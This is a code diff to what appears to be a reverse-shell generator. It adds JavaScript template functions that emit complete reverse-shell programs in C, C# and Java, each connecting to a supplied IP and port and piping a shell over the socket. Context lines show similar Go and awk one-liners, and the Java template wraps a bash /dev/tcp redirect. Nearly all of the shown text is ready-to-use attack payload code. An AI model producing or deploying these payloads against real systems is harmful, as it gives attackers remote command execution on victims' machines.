@@ -128,6 +128,120 @@
         `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,
       awk_rev: (ip, port) =>
         `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
+
+       c_rev: (ip, port) =>
+        `#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+    int port = ${port};
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("${ip}");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"sh", NULL};
+    execvp("sh", argv);
+
+    return 0;       
+}`,
+
+       cs_rev: (ip, port) =>
+        `using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+
+
+namespace ConnectBack
+{
+	public class Program
+	{
+		static StreamWriter streamWriter;
+
+		public static void Main(string[] args)
+		{
+			using(TcpClient client = new TcpClient("${ip}", ${port}))
+			{
+				using(Stream stream = client.GetStream())
+				{
+					using(StreamReader rdr = new StreamReader(stream))
+					{
+						streamWriter = new StreamWriter(stream);
+						
+						StringBuilder strInput = new StringBuilder();
+
+						Process p = new Process();
+						p.StartInfo.FileName = "sh";
+						p.StartInfo.CreateNoWindow = true;
+						p.StartInfo.UseShellExecute = false;
+						p.StartInfo.RedirectStandardOutput = true;
+						p.StartInfo.RedirectStandardInput = true;
+						p.StartInfo.RedirectStandardError = true;
+						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						p.Start();
+						p.BeginOutputReadLine();
+
+						while(true)
+						{
+							strInput.Append(rdr.ReadLine());
+							//strInput.Append("\n");
+							p.StandardInput.WriteLine(strInput);
+							strInput.Remove(0, strInput.Length);
+						}
+					}
+				}
+			}
+		}
+
+		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err) { }
+            }
+        }
+
+	}
+}`,
+
+      java_rev: (ip, port) =>
+        `public class shell {
+    public static void main(String[] args) {
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/${ip}/${port} 0>&1");
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}`,
+      
     },
 
     bind: {
